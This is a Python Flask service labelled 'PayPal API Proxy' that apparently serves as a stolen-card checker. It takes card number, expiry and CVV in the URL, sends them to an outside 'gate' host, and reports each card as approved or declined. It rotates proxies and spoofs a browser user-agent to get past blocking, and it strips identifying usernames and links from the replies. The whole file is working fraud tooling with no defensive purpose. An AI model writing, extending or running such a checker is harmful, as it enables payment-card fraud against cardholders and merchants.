from flask import Flask, request, jsonify
import requests
import re
import random

app = Flask(__name__)

# Configuration
TARGET_API_BASE = "https://paypal.cxchk.site/gate=pp1"

# Multiple proxy options as fallback
PROXY_CONFIGS = [
    "TITS.OOPS.WTF:6969:asyncio:requests",
    # Add more proxies here if you have them
]

def sanitize_response(text):
    """
    Remove usernames, links, and @ mentions from response text
    """
    if not text:
        return ""
    
    # Remove @mentions (usernames)
    text = re.sub(r'@\w+', '', text)
    
    # Remove URLs
    text = re.sub(r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', '', text)
    
    # Remove common link patterns
    text = re.sub(r'www\.\w+\.\w+', '', text)
    
    return text.strip()

def parse_cc_parameter(cc_param):
    """
    Parse CC parameter in different formats (with | separator)
    Returns: cc, mm, yyyy, cvv
    """
    parts = cc_param.split('|')
    
    if len(parts) == 4:
        cc, mm, yyyy_or_yy, cvv = parts
        
        # Handle year format (yy or yyyy)
        if len(yyyy_or_yy) == 2:
            yyyy = f"20{yyyy_or_yy}"  # Assuming 21st century
        else:
            yyyy = yyyy_or_yy
            
        return cc, mm, yyyy, cvv
    
    return None, None, None, None

def make_request_with_fallback(target_url):
    """
    Try request with different approaches if 403 occurs
    """
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    
    # Try without proxy first
    try:
        response = requests.get(target_url, headers=headers, timeout=30)
        if response.status_code == 200:
            return response
    except:
        pass
    
    # Try with random proxy from list
    for proxy_config in PROXY_CONFIGS:
        try:
            proxy_url = f"{target_url}?proxy={proxy_config}"
            response = requests.get(proxy_url, headers=headers, timeout=30)
            if response.status_code == 200:
                return response
        except:
            continue
    
    return None

@app.route('/paypal$1/gate=pp/cc=<path:cc_param>')
def process_credit_card(cc_param):
    """
    Main endpoint that processes credit card requests
    """
    try:
        # Parse the CC parameter
        cc, mm, yyyy, cvv = parse_cc_parameter(cc_param)
        
        if not all([cc, mm, yyyy, cvv]):
            return jsonify({
                "code": "INVALID_PARAMETERS",
                "message": "Invalid credit card parameter format. Use: cc|mm|yyyy|cvv or cc|mm|yy|cvv",
                "status": "declined"
            }), 400
        
        # Build the target URL without proxy first
        base_target_url = f"{TARGET_API_BASE}/cc={cc}|{mm}|{yyyy}|{cvv}"
        
        # Try making the request with fallback options
        response = make_request_with_fallback(base_target_url)
        
        if response and response.status_code == 200:
            # Sanitize the response
            sanitized_content = sanitize_response(response.text)
            
            # Try to parse JSON response
            try:
                api_data = response.json()
                
                # Extract code and status from the API response
                code = api_data.get('code', 'UNKNOWN_ERROR')
                status = api_data.get('status', 'declined')
                message = api_data.get('message', '')
                
                # Sanitize message if it exists
                if message:
                    message = sanitize_response(message)
                
            except ValueError:
                # If response is not JSON, use the sanitized text
                code = "TEXT_RESPONSE"
                status = "processed"
                message = sanitized_content
            
            # Return formatted response
            return jsonify({
                "cc": f"{cc}|{mm}|{yyyy}|{cvv}",
                "response": message,
                "status": status,
                "code": code
            })
        else:
            # If all requests failed, try direct with a proxy
            try:
                proxy_config = random.choice(PROXY_CONFIGS)
                final_url = f"{base_target_url}?proxy={proxy_config}"
                final_response = requests.get(final_url, timeout=30)
                
                if final_response.status_code == 200:
                    # Process successful response
                    sanitized_content = sanitize_response(final_response.text)
                    return jsonify({
                        "cc": f"{cc}|{mm}|{yyyy}|{cvv}",
                        "response": sanitized_content,
                        "status": "approved",
                        "code": "PROXY_SUCCESS"
                    })
                else:
                    return jsonify({
                        "code": "API_BLOCKED",
                        "message": f"Target API blocked all requests. Status: {final_response.status_code if final_response else 'No response'}",
                        "status": "declined"
                    }), 200
                    
            except Exception as e:
                return jsonify({
                    "code": "NETWORK_BLOCKED",
                    "message": "All connection attempts were blocked. The target API may have strict security measures.",
                    "status": "declined"
                }), 200
            
    except Exception as e:
        return jsonify({
            "code": "INTERNAL_ERROR",
            "message": f"Internal server error: {str(e)}",
            "status": "error"
        }), 500

@app.route('/test')
def test_endpoint():
    """
    Test endpoint to check if API is working
    """
    return jsonify({
        "status": "API is running",
        "message": "Service is online but target API may be blocking requests",
        "timestamp": "2024-01-01 00:00:00"
    })

@app.route('/health')
def health_check():
    """
    Health check endpoint for monitoring
    """
    return jsonify({"status": "healthy", "service": "PayPal API Proxy"})

@app.route('/')
def home():
    """
    Home endpoint with usage information
    """
    return jsonify({
        "service": "PayPal API Proxy",
        "usage": "/paypal$1/gate=pp/cc=CC|MM|YYYY|CVV",
        "example": "/paypal$1/gate=pp/cc=4546177184967023|01|2028|222",
        "note": "If getting 403 errors, the target API may be blocking requests from cloud platforms"
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
